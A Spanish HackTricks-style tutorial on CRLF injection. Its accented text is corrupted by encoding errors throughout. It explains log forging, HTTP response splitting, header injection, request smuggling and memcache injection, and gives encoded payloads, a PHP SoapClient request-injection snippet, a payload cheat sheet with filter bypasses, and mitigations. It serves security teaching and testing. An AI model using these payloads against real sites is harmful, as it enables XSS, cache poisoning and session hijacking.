# Inyecci√≥n de CRLF (%0D%0A)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de recompensa por errores**: **Reg√≠strate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) y Line Feed (LF), conocidos colectivamente como CRLF, son secuencias de caracteres especiales utilizadas en el protocolo HTTP para denotar el final de una l√≠nea o el inicio de una nueva. Los servidores web y los navegadores utilizan CRLF para distinguir entre las cabeceras HTTP y el cuerpo de una respuesta. Estos caracteres se emplean universalmente en las comunicaciones HTTP/1.1 en varios tipos de servidores web, como Apache y Microsoft IIS.

### Vulnerabilidad de Inyecci√≥n de CRLF

La inyecci√≥n de CRLF implica la inserci√≥n de los caracteres CR y LF en la entrada proporcionada por el usuario. Esta acci√≥n enga√±a al servidor, la aplicaci√≥n o el usuario haci√©ndoles interpretar la secuencia inyectada como el final de una respuesta y el comienzo de otra. Aunque estos caracteres no son inherentemente da√±inos, su mal uso puede llevar a la divisi√≥n de respuestas HTTP y otras actividades maliciosas.

### Ejemplo: Inyecci√≥n de CRLF en un Archivo de Registro

[Ejemplo de aqu√≠](https://www.invicti.com/blog/web-security/crlf-http-header/)

Considera un archivo de registro en un panel de administraci√≥n que sigue el formato: `IP - Hora - Ruta Visitada`. Una entrada t√≠pica podr√≠a ser:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Un atacante puede explotar una inyecci√≥n de CRLF para manipular este registro. Al inyectar caracteres CRLF en la solicitud HTTP, el atacante puede alterar el flujo de salida y fabricar entradas en el registro. Por ejemplo, una secuencia inyectada podr√≠a transformar la entrada del registro en:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Aqu√≠, `%0d` y `%0a` representan las formas codificadas en URL de CR y LF. Despu√©s del ataque, el registro mostrar√≠a de forma enga√±osa:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
El atacante as√≠ oculta sus actividades maliciosas haciendo que parezca que el localhost (una entidad t√≠picamente confiable dentro del entorno del servidor) realiz√≥ las acciones. El servidor interpreta la parte de la consulta que comienza con `%0d%0a` como un √∫nico par√°metro, mientras que el par√°metro `restrictedaction` se analiza como otra entrada separada. La consulta manipulada imita efectivamente un comando administrativo leg√≠timo: `/index.php?page=home&restrictedaction=edit`

### Divisi√≥n de Respuesta HTTP

#### Descripci√≥n

La Divisi√≥n de Respuesta HTTP es una vulnerabilidad de seguridad que surge cuando un atacante explota la estructura de las respuestas HTTP. Esta estructura separa los encabezados del cuerpo utilizando una secuencia de caracteres espec√≠fica, Retorno de Carro (CR) seguido de Avance de L√≠nea (LF), colectivamente denominado como CRLF. Si un atacante logra insertar una secuencia CRLF en un encabezado de respuesta, puede manipular efectivamente el contenido de la respuesta subsiguiente. Este tipo de manipulaci√≥n puede llevar a problemas de seguridad graves, especialmente Cross-site Scripting (XSS).

#### XSS a trav√©s de la Divisi√≥n de Respuesta HTTP

1. La aplicaci√≥n establece un encabezado personalizado de esta manera: `X-Custom-Header: UserInput`
2. La aplicaci√≥n obtiene el valor para `UserInput` de un par√°metro de consulta, digamos "user\_input". En escenarios que carecen de una validaci√≥n adecuada de la entrada y codificaci√≥n, un atacante puede crear un payload que incluya la secuencia CRLF, seguida de contenido malicioso.
3. Un atacante crea una URL con un 'user\_input' especialmente dise√±ado: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* En esta URL, `%0d%0a%0d%0a` es la forma codificada en URL de CRLFCRLF. Enga√±a al servidor para que inserte una secuencia CRLF, haciendo que el servidor trate la parte subsiguiente como el cuerpo de la respuesta.
4. El servidor refleja la entrada del atacante en el encabezado de respuesta, lo que lleva a una estructura de respuesta no deseada donde el script malicioso es interpretado por el navegador como parte del cuerpo de la respuesta.

#### Un ejemplo de Divisi√≥n de Respuesta HTTP que conduce a una Redirecci√≥n

Desde [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navegador a:
```
/%0d%0aLocation:%20http://myweb.com
```
Y el servidor responde con el encabezado:
```
Location: http://myweb.com
```
**Otro ejemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### En la ruta URL

Puedes enviar el payload **dentro de la ruta URL** para controlar la **respuesta** del servidor (ejemplo de [aqu√≠](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Ver m√°s ejemplos en:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inyecci√≥n de Cabeceras HTTP

La Inyecci√≥n de Cabeceras HTTP, a menudo explotada a trav√©s de la inyecci√≥n CRLF (retorno de carro y avance de l√≠nea), permite a los atacantes insertar cabeceras HTTP. Esto puede socavar mecanismos de seguridad como los filtros XSS (Cross-Site Scripting) o la pol√≠tica SOP (Same-Origin Policy), lo que potencialmente lleva a un acceso no autorizado a datos sensibles, como tokens CSRF, o la manipulaci√≥n de sesiones de usuario a trav√©s de la inserci√≥n de cookies.

#### Explotando CORS a trav√©s de la Inyecci√≥n de Cabeceras HTTP

Un atacante puede inyectar cabeceras HTTP para habilitar CORS (Cross-Origin Resource Sharing), eludiendo las restricciones impuestas por SOP. Esta vulnerabilidad permite que scripts de or√≠genes maliciosos interact√∫en con recursos de un origen diferente, potencialmente accediendo a datos protegidos.

#### SSRF e Inyecci√≥n de Peticiones HTTP a trav√©s de CRLF

La inyecci√≥n CRLF se puede utilizar para crear e inyectar una nueva petici√≥n HTTP por completo. Un ejemplo notable de esto es la vulnerabilidad en la clase `SoapClient` de PHP, espec√≠ficamente dentro del par√°metro `user_agent`. Al manipular este par√°metro, un atacante puede insertar cabeceras adicionales y contenido del cuerpo, o incluso inyectar una nueva petici√≥n HTTP por completo. A continuaci√≥n se muestra un ejemplo en PHP que demuestra esta explotaci√≥n:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Inyecci√≥n de encabezados para Request Smuggling

Para obtener m√°s informaci√≥n sobre esta t√©cnica y los problemas potenciales, [**consulte la fuente original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Puede inyectar encabezados esenciales para asegurar que el **back-end mantenga la conexi√≥n abierta** despu√©s de responder a la solicitud inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Despu√©s, se puede especificar una segunda solicitud. Este escenario generalmente implica [HTTP request smuggling](http-request-smuggling/), una t√©cnica donde encabezados adicionales o elementos de cuerpo a√±adidos por el servidor post-inyecci√≥n pueden llevar a varios exploits de seguridad.

**Explotaci√≥n:**

1. **Inyecci√≥n de Prefijo Malicioso**: Este m√©todo implica envenenar la pr√≥xima solicitud del usuario o una cach√© web especificando un prefijo malicioso. Un ejemplo de esto es:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%a HTTP/1.1`

2. **Creaci√≥n de un Prefijo para Envenenamiento de la Cola de Respuestas**: Este enfoque implica crear un prefijo que, cuando se combina con basura adicional, forma una segunda solicitud completa. Esto puede desencadenar el envenenamiento de la cola de respuestas. Un ejemplo es:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Inyecci√≥n de Memcache

Memcache es un **almacenamiento de clave-valor que utiliza un protocolo de texto claro**. M√°s informaci√≥n en:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Para obtener la informaci√≥n completa, lee el** [**informe original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Si una plataforma est√° tomando **datos de una solicitud HTTP y us√°ndolos sin sanear** para realizar **solicitudes** a un servidor **memcache**, un atacante podr√≠a abusar de este comportamiento para **inyectar nuevos comandos de memcache**.

Por ejemplo, en la vulnerabilidad original descubierta, las claves de cach√© se usaban para devolver la IP y el puerto al que un usuario deb√≠a conectarse, y los atacantes pod√≠an **inyectar comandos de memcache** que **envenenar√≠an** la **cach√© para enviar los detalles de las v√≠ctimas** (incluidos nombres de usuario y contrase√±as) a los servidores del atacante:

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Adem√°s, los investigadores tambi√©n descubrieron que pod√≠an dessincronizar las respuestas de memcache para enviar las IPs y puertos de los atacantes a usuarios cuyos correos electr√≥nicos el atacante no conoc√≠a:

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### C√≥mo Prevenir Inyecciones de CRLF / Encabezados HTTP en Aplicaciones Web

Para mitigar los riesgos de inyecciones de CRLF (retorno de carro y avance de l√≠nea) o encabezados HTTP en aplicaciones web, se recomiendan las siguientes estrategias:

1. **Evitar la Entrada Directa del Usuario en los Encabezados de Respuesta:** El enfoque m√°s seguro es abstenerse de incorporar la entrada suministrada por el usuario directamente en los encabezados de respuesta.
2. **Codificar Caracteres Especiales:** Si no es posible evitar la entrada directa del usuario, aseg√∫rate de emplear una funci√≥n dedicada a codificar caracteres especiales como CR (retorno de carro) y LF (avance de l√≠nea). Esta pr√°ctica evita la posibilidad de inyecci√≥n de CRLF.
3. **Actualizar el Lenguaje de Programaci√≥n:** Actualiza regularmente el lenguaje de programaci√≥n utilizado en tus aplicaciones web a la √∫ltima versi√≥n. Opta por una versi√≥n que inherentemente proh√≠ba la inyecci√≥n de caracteres CR y LF dentro de funciones encargadas de establecer encabezados HTTP.

### HOJA DE TRUCOS

[Hoja de trucos desde aqu√≠](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Herramientas Autom√°ticas

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista de Detecci√≥n de Fuerza Bruta

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Referencias

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de recompensa por errores**: **reg√≠strate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
